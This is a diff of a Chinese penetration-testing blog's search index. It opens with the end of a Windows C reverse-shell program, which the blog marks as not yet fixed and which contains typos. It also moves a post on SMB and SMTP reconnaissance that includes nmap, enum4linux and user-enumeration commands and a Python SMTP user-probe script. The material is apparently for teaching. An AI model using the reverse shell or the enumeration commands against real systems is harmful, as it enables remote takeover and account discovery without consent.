*)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>windows.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>) </span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 免杀 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 免杀 </tag>
+            
+            <tag> msfvenom </tag>
+            
+            <tag> MSF </tag>
+            
+            <tag> Hyperion </tag>
+            
+            <tag> strings </tag>
+            
+            <tag> C </tag>
             
             <tag> gcc </tag>
             
@@ -278,17 +401,17 @@
             
             <tag> nc </tag>
             
-            <tag> http代理 </tag>
+            <tag> ncat </tag>
+            
+            <tag> iodine </tag>
             
             <tag> DNS隧道 </tag>
             
             <tag> 隧道嵌套 </tag>
             
-            <tag> ncat </tag>
-            
-            <tag> iodine </tag>
-            
             <tag> ssh </tag>
+            
+            <tag> http代理 </tag>
             
         </tags>
       
@@ -315,15 +438,15 @@
       
         <tags>
             
-            <tag> dns2tcp </tag>
-            
-            <tag> squid3 </tag>
-            
-            <tag> http代理 </tag>
-            
             <tag> DNS隧道 </tag>
             
             <tag> 隧道嵌套 </tag>
+            
+            <tag> http代理 </tag>
+            
+            <tag> dns2tcp </tag>
+            
+            <tag> squid3 </tag>
             
             <tag> Bodhi </tag>
             
@@ -809,9 +932,9 @@
       
         <tags>
             
-            <tag> 拒绝服务攻击 </tag>
-            
             <tag> DoS攻击 </tag>
+            
+            <tag> 拒绝服务攻击 </tag>
             
             <tag> ARP欺骗 </tag>
             
@@ -910,9 +1033,9 @@
             
             <tag> SQL注入 </tag>
             
-            <tag> 联合查询 </tag>
-            
             <tag> Burpsuit </tag>
+            
+            <tag> 联合查询 </tag>
             
         </tags>
       
@@ -943,9 +1066,9 @@
             
             <tag> SQL注入 </tag>
             
-            <tag> Burpsuit </tag>
-            
             <tag> SQL盲注 </tag>
+            
+            <tag> Burpsuit </tag>
             
         </tags>
       
@@ -1015,9 +1138,9 @@
       
         <tags>
             
-            <tag> 拒绝服务攻击 </tag>
-            
             <tag> DoS攻击 </tag>
+            
+            <tag> 拒绝服务攻击 </tag>
             
             <tag> 入侵检测 </tag>
             
@@ -1050,9 +1173,9 @@
       
         <tags>
             
-            <tag> DoS攻击 </tag>
-            
             <tag> python </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> HULK </tag>
             
@@ -1089,13 +1212,13 @@
       
         <tags>
             
-            <tag> 拒绝服务攻击 </tag>
+            <tag> python </tag>
             
             <tag> DoS攻击 </tag>
             
-            <tag> 缓冲区溢出 </tag>
+            <tag> 拒绝服务攻击 </tag>
             
-            <tag> python </tag>
+            <tag> 缓冲区溢出 </tag>
             
             <tag> Slowhttptest </tag>
             
@@ -1229,11 +1352,11 @@
       
         <tags>
             
-            <tag> 拒绝服务攻击 </tag>
+            <tag> python </tag>
             
             <tag> DoS攻击 </tag>
             
-            <tag> python </tag>
+            <tag> 拒绝服务攻击 </tag>
             
             <tag> teardrop </tag>
             
@@ -1262,19 +1385,19 @@
       
         <tags>
             
+            <tag> python </tag>
+            
+            <tag> C </tag>
+            
+            <tag> DoS攻击 </tag>
+            
             <tag> 拒绝服务攻击 </tag>
             
             <tag> scapy </tag>
             
-            <tag> DoS攻击 </tag>
-            
-            <tag> python </tag>
-            
             <tag> Smurf </tag>
             
             <tag> sockstress </tag>
-            
-            <tag> C </tag>
             
             <tag> TCP </tag>
             
@@ -1303,13 +1426,13 @@
       
         <tags>
             
-            <tag> 拒绝服务攻击 </tag>
-            
-            <tag> scapy </tag>
+            <tag> python </tag>
             
             <tag> DoS攻击 </tag>
             
-            <tag> python </tag>
+            <tag> 拒绝服务攻击 </tag>
+            
+            <tag> scapy </tag>
             
             <tag> TCP </tag>
             
@@ -1338,9 +1461,9 @@
       
         <tags>
             
-            <tag> 拒绝服务攻击 </tag>
-            
             <tag> DoS攻击 </tag>
+            
+            <tag> 拒绝服务攻击 </tag>
             
             <tag> DDoS攻击 </tag>
             
@@ -1373,9 +1496,9 @@
       
         <tags>
             
-            <tag> 缓冲区溢出 </tag>
-            
             <tag> python </tag>
+            
+            <tag> 缓冲区溢出 </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1497,9 +1620,9 @@
       
         <tags>
             
-            <tag> 无线加密 </tag>
-            
             <tag> WPA </tag>
+            
+            <tag> 无线加密 </tag>
             
         </tags>
       
@@ -1826,45 +1949,6 @@
     
     
     <entry>
-      <title>SMB扫描及SMTP扫描</title>
-      <link href="/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/"/>
-      <url>/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/</url>
-      
-        <content type="html"><![CDATA[<h4 id="Server-Message-Block-协议"><a href="#Server-Message-Block-协议" class="headerlink" title="Server Message Block 协议"></a><strong>Server Message Block 协议</strong></h4><p>微软历史上出现安全问题最多的协议<br>    实现复杂<br>    默认开放<br>    文件共享<br>    空会话未身份人证访问(SMB1)<br>        密码策略<br>        用户名<br>        组名<br>        机器名<br>        用户,组SID</p><blockquote><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a><strong>SMB扫描</strong></h4></blockquote><h5 id="nmap–SMB扫描"><a href="#nmap–SMB扫描" class="headerlink" title="nmap–SMB扫描"></a><strong>nmap</strong>–SMB扫描</h5><pre><code>nmap -v -p139,445 192.168.254.0/24nmap 192.168.254.102 -p139,445 --script=smb-os-discovery.nse #判断系统信息nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.254.102 #探测漏洞信息ls /usr/share/nmap/scripts/  #nmap脚本放置路径</code></pre><h5 id="nbtscan–SMB扫描"><a href="#nbtscan–SMB扫描" class="headerlink" title="nbtscan–SMB扫描"></a><strong>nbtscan</strong>–SMB扫描</h5><pre><code>nbtscan -r 192.168.254.0/24</code></pre><h5 id="enum4linux–SMB扫描"><a href="#enum4linux–SMB扫描" class="headerlink" title="enum4linux–SMB扫描"></a><strong>enum4linux</strong>–SMB扫描</h5><pre><code>enum4linux -a 192.168.254.102</code></pre><blockquote><h4 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a><strong>SMTP扫描</strong></h4></blockquote><h5 id="nc–SMTP扫描"><a href="#nc–SMTP扫描" class="headerlink" title="nc–SMTP扫描"></a><strong>nc</strong>–SMTP扫描</h5><pre><code>nc -nc 1.1.1.1 25HELO 163.com    VRFY root</code></pre><h5 id="nmap–SMTP扫描"><a href="#nmap–SMTP扫描" class="headerlink" title="nmap–SMTP扫描"></a><strong>nmap</strong>–SMTP扫描</h5><pre><code>nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}nmap smtp.163.com -p25 --script=smtp-open-relay.nse</code></pre><h5 id="smtp-user-enum–SMTP扫描"><a href="#smtp-user-enum–SMTP扫描" class="headerlink" title="smtp-user-enum–SMTP扫描"></a><strong>smtp-user-enum</strong>–SMTP扫描</h5><pre><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></pre><h5 id="python-smtp-scan-py"><a href="#python-smtp-scan-py" class="headerlink" title="python ./smtp_scan.py"></a><strong>python</strong> <code>./smtp_scan.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: smtp_scan.py &lt;username&gt;"</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'smtp.163.com'</span>,<span class="number">25</span>))</span><br><span class="line">banner=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> banner+<span class="string">'aaaaa'</span></span><br><span class="line">s.send(<span class="string">'RCPT'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'\r\n'</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 信息收集 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> nmap </tag>
-            
-            <tag> python </tag>
-            
-            <tag> SMB扫描 </tag>
-            
-            <tag> SMTP扫描 </tag>
-            
-            <tag> nc </tag>
-            
-            <tag> nbtscan </tag>
-            
-            <tag> enum4linux </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>WAF扫描识别及负载均衡识别</title>
       <link href="/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
       <url>/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
@@ -1883,9 +1967,9 @@
       
         <tags>
             
-            <tag> nmap </tag>
-            
             <tag> python </tag>
+            
+            <tag> nmap </tag>
             
             <tag> lbd </tag>
             
@@ -1894,6 +1978,45 @@
             <tag> wafw00f </tag>
             
             <tag> 负载均衡 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SMB扫描及SMTP扫描</title>
+      <link href="/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/"/>
+      <url>/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Server-Message-Block-协议"><a href="#Server-Message-Block-协议" class="headerlink" title="Server Message Block 协议"></a><strong>Server Message Block 协议</strong></h4><p>微软历史上出现安全问题最多的协议<br>    实现复杂<br>    默认开放<br>    文件共享<br>    空会话未身份人证访问(SMB1)<br>        密码策略<br>        用户名<br>        组名<br>        机器名<br>        用户,组SID</p><blockquote><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a><strong>SMB扫描</strong></h4></blockquote><h5 id="nmap–SMB扫描"><a href="#nmap–SMB扫描" class="headerlink" title="nmap–SMB扫描"></a><strong>nmap</strong>–SMB扫描</h5><pre><code>nmap -v -p139,445 192.168.254.0/24nmap 192.168.254.102 -p139,445 --script=smb-os-discovery.nse #判断系统信息nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.254.102 #探测漏洞信息ls /usr/share/nmap/scripts/  #nmap脚本放置路径</code></pre><h5 id="nbtscan–SMB扫描"><a href="#nbtscan–SMB扫描" class="headerlink" title="nbtscan–SMB扫描"></a><strong>nbtscan</strong>–SMB扫描</h5><pre><code>nbtscan -r 192.168.254.0/24</code></pre><h5 id="enum4linux–SMB扫描"><a href="#enum4linux–SMB扫描" class="headerlink" title="enum4linux–SMB扫描"></a><strong>enum4linux</strong>–SMB扫描</h5><pre><code>enum4linux -a 192.168.254.102</code></pre><blockquote><h4 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a><strong>SMTP扫描</strong></h4></blockquote><h5 id="nc–SMTP扫描"><a href="#nc–SMTP扫描" class="headerlink" title="nc–SMTP扫描"></a><strong>nc</strong>–SMTP扫描</h5><pre><code>nc -nc 1.1.1.1 25HELO 163.com    VRFY root</code></pre><h5 id="nmap–SMTP扫描"><a href="#nmap–SMTP扫描" class="headerlink" title="nmap–SMTP扫描"></a><strong>nmap</strong>–SMTP扫描</h5><pre><code>nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}nmap smtp.163.com -p25 --script=smtp-open-relay.nse</code></pre><h5 id="smtp-user-enum–SMTP扫描"><a href="#smtp-user-enum–SMTP扫描" class="headerlink" title="smtp-user-enum–SMTP扫描"></a><strong>smtp-user-enum</strong>–SMTP扫描</h5><pre><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></pre><h5 id="python-smtp-scan-py"><a href="#python-smtp-scan-py" class="headerlink" title="python ./smtp_scan.py"></a><strong>python</strong> <code>./smtp_scan.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: smtp_scan.py &lt;username&gt;"</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'smtp.163.com'</span>,<span class="number">25</span>))</span><br><span class="line">banner=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> banner+<span class="string">'aaaaa'</span></span><br><span class="line">s.send(<span class="string">'RCPT'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'\r\n'</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 信息收集 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> nmap </tag>
+            
+            <tag> SMB扫描 </tag>
+            
+            <tag> SMTP扫描 </tag>
+            
+            <tag> nc </tag>
+            
+            <tag> nbtscan </tag>
+            
+            <tag> enum4linux </tag>
             
         </tags>
       
@@ -1920,9 +2043,9 @@
       
         <tags>
             
-            <tag> nmap </tag>
-            
             <tag> python </tag>
+            
+            <tag> nmap </tag>
             
             <tag> SNMP </tag>
             
@@ -1957,9 +2080,9 @@
       
         <tags>
             
-            <tag> nmap </tag>
-            
             <tag> python </tag>
+            
+            <tag> nmap </tag>
             
             <tag> nc </tag>
             
@@ -1994,9 +2117,9 @@
       
         <tags>
             
-            <tag> nmap </tag>
-            
             <tag> python </tag>
+            
+            <tag> nmap </tag>
             
             <tag> nc </tag>
             
@@ -2033,11 +2156,11 @@
       
         <tags>
             
+            <tag> python </tag>
+            
             <tag> UDP </tag>
             
             <tag> nmap </tag>
-            
-            <tag> python </tag>
             
             <tag> TCP </tag>
             
@@ -2163,9 +2286,9 @@
       
         <tags>
             
-            <tag> kali </tag>
-            
             <tag> 被动信息收集 </tag>
+            
+            <tag> kali </tag>
             
             <tag> 渗透 </tag>
             
